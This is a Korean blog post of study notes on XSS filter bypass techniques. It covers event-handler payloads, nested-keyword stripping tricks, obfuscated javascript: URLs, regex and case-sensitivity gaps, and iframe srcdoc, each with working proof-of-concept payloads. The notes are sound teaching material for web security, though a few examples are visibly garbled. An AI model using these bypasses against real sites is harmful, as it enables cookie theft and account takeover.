---
layout: post
title: "XSS filtering bypass 1"
categories: [Web Hacking]
tags: [XSS, Filtering, Bypass]
last_modified_at: 2023-11-07
---

XSS 필터링 -> 안전한 마크업만 허용하는 보수적 방식

### 1. 이벤트 핸들러 속성
자바스크립트 코드 실행 태그 `<script>` 이외에도 존재  
태그의 속성값으로 스크립트 포함하는 경우 多  

그중에서  
이벤트 핸들러 속성 -> on  
이벤트 핸들러: 특정 요소에서 발생하는 이벤트 처리 위함, 콜백 형태의 핸들러 함수  
이벤트 핸들러 내에 XSS 공격 코드 삽입 -> XSS 공격 코드 실행  
이벤트 핸들러 종류 다양 -> 원리도 다양 (advanced. mozilla developer network)  
자주 사용 -> onload, onerror, onfocus  

#### 1) onload 이벤트 핸들러
```html
<img src="https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
<!-- -> 유효한 이미지 로드 후 onload 핸들러 실행 -->

<img src="about:invalid" onload="alert(document.domain)">
<!-- -> 이미지 로드 실패, onload 핸들러 실행하지 않음 -->
```

#### 2) onerror 이벤트 핸들러
onload와 반대
```html
<img src="valid.jpg" onerror="alert(document.domain)">
<!-- -> 유효한 이미지 로드 성공, onerror 핸들러 실행하지 않음 -->

<img src="about:invalid" onerror="alert(document.domain)">
<!-- -> 이미지 로드 실패, onerror 핸들러 실행 -->
```

#### 3) onfocus 이벤트 핸들러
input 태그에 커서 클릭 -> focus -> 이벤트 핸들러 실행  
공격할 때는 자동 포커스 시켜서 핸들러 실행하도록 함  
1. autofocus  
2. URL의 해시부분 id 속성값 ex.http://dreamhack.io/#inputID
```html
<input type="text" id="inputID" onfocus="alert(document.domain)" autofocus>
```

### 2. 문자열 치환
script 필터링 -> scrscriptipt 같은 중간삽입  
script가 제거되면서 또 하나의 script 만들어짐  
필터링 우회 예시
```javascript
(x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
--> <img onerror=prompt(1) />
```

문자열 치환 우회: 위 필터링 대응 방안, 문자열에 변화가 없을 때까지 지속적으로 치환하는 방법  
특정 키워드가 최종 마크업에 등장하지 않음  
but, 고려하지 못한 구문이나 WAF 방어 무력화 등에는 여전히 취약  
```javascript
function replaceIterate(text) {
    while (true) {
        var newText = text
            .replace(/script|onerror/gi, '');
        if (newText === text) break;
        text = newText;
    }
    return text;
}
replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,<svg>" onloadonerror="alert(1)" />')
--> <img src="data:image/svg+xml,<svg>" onload="alert(1)" />
replaceIterate('<ifronerrorame srcdoc="<sonerrorcript>parent.alescronerroriptrt(1)</scrionerrorpt>" />')
--> <iframe srcdoc="<>parent.alert(1)</>" />
```
* 코드 풀이:  
replaceIterate 함수는 newText와 text가 000이면 break하고 그렇지 않을 때마다 newText 함수를 실행  

자바스크립트 var: 변수 선언 시 필요  
```javascript
var a= 0;
var b;
```
값을 할당하거나 빈 변수 선언 가능  

*호이스팅  

```html
<imgscript src="data:image/svg+scriptxml,<svg>" onloadscript="alert(1)" />
```

### 3. 활성 하이퍼링크
HTML 마크업에서 사용하는 URL은 활성 콘텐츠 포함 가능  
이중 javascript: 스키마 -> URL 로드 시, 자바스크립트 코드 실행  
예시
```html
<a href="javascript:alert(document.domain)">Click me!</a>
<iframe src="javascript:alert(document.domain)"></iframe>
```
a태그나 iframe 태그 -> javascript: 스키마(활성 콘텐츠) -> URL 로드  
때문에 XSS 필터링 시, javascript: 스키마 사용하지 못하게 필터링  

#### 1) 정규화를 이용하여 우회
*정규화(normalization): 브라우저가 URL 사용 시 거치는 과정, 동일한 리소스를 나타내는 URL들 통합하는 과정  
\x01, \x04, \t 같은 특수문자 제거, 스키마 대소문자 통일 과정 등이 존재  
```html
<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
<iframe src="\1\4jAVasC\triPT:alert(document.domain)"></iframe>
```

#### 2) HTML Entity Encoding을 통한 우회  
HTML 태그 속성 내에서 HTML Entity Encoding 사용 가능  
이를 이용해 javascript: 스키마나 이외의 xss 키워드 인코딩 -> 필터링 우회  
```html
<a href="\1JavasCr\tip&tab;:alert(document.domain);">Click me!</a>
<iframe src="\1JavasCr\tip&tab;:alert(document.domain);"></iframe>
```
HTML Entity Encoding이 뭔데 그래서  
HTML에서 특수 기능하는 문자를 문서 내용으로써 삽입하기 위한 인코딩  

예를 들어  
```html
<script> alert("ABC") </script>
```
구문을  
```html
<script> alert("ABC") </script>
```
로 인코딩 수정할 수 있음  

직접 URL을 정규화 해보자  
자바스크립트는 URL 객체를 통해 정규화 가능  
protocol, hostname 등 URL의 각종 정보 추출 가능  
```javascript
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)').href
--> "javascript:alert(1)"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').protocol
--> "javascript:"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').pathname
--> "alert(1)"
```
\4,\t 등 모두 삭제  

### 4. 태그와 속성 기반 필터링
#### 1) 대문자 혹은 소문자만 인식하는 필터 우회
```javascript
x => !x.includes('script') && !x.includes('on')
```
위에서는 특정 키워드(script, on)의 대소문자를 모두 검사하지 않는다  
다음과 같이 우회할 수 있다  
```html
<sCRipT>alert(document.cookie)</scriPT>
<img src=x: oneRroR=alert(document.cookie) />
```

#### 2) 잘못된 정규표현식을 사용한 필터 우회
키워드 필터링은 정규표현식을 사용한다.  
다음은 스크립트 태그 내에 데이터가 존재하는지 검사하는 정규 표현식  
```javascript
x => !/<script[^>]*>[^<]/i.test(x)
```
스크립트 태그는 태그 내에 데이터 존재하지 않아도 src 속성으로 입력 가능  
```html
<script src="data:,alert(document.cookie)"></script>
```

다음은 img 태그에 on 이벤트 핸들러가 존재하는지 검사하는 정규표현식  
```javascript
x => !/<img.*on/i.test(x)
```
하지만 멀티 라인에 대한 검사는 존재 X -> 이를 우회  
```html
<img src=""\nonerror="alert(document.cookie)"/>
```

#### 3) 특정 태그 및 속성에 대하 필터링을 다른 태그/속성을 이용하여 필터 우회
다음은 script, img, input 태그 필터링  
```javascript
x => !/<script|<img|<input/i.test(x)
```
HTML 내에는 이외에도 다른 태그를 사용해서 공격 가능(아래 예시)  
```html
<video><source onerror="alert(document.domain)"/></video>
<body onload="alert(document.domain)"/>
```

다음은 on 이벤트 핸들러 사용 X && 멀티 라인 지원하는 문자 검사  
```javascript
x => !/<script|<img|<input|<.*on/is.test(x)
```
iframe 태그로 우회 가능, iframe 태그의 src 속성은 URL을 인자로 받음  
-> 활성 하이퍼링크 사용 -> 자바스크립트 코드 삽입 가능  
srcdoc 속성 사용도 가능( xss 공격 코드 입력)  
```html
<iframe src="javascript:alert(parent.document.domain)"></iframe>
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)"/> </iframe>
```

data.toLowerCase().includes('script')  
자바스크립트에서 toLowercase()는 모두 소문자로 바꾸는 함수  

오답정리  
```javascript
function XSSFilter(data){
  if(data.toLowerCase().includes('script') ||
     data.toLowerCase().includes('on')){
    return false;
  }
  return true;
}
```
위 필터링 우회해서 alert 실행  
```html
<iframe srcdoc='<img src=about: onerror=parent.alert(document.domain)'></iframe>
```
srcdoc 호출 parent.alert 호출 -> 삽입된 xss 페이로드 iframe 안에서 호출, 페이로드 호출 상위 문서에 존재하는 alert 호출해야됨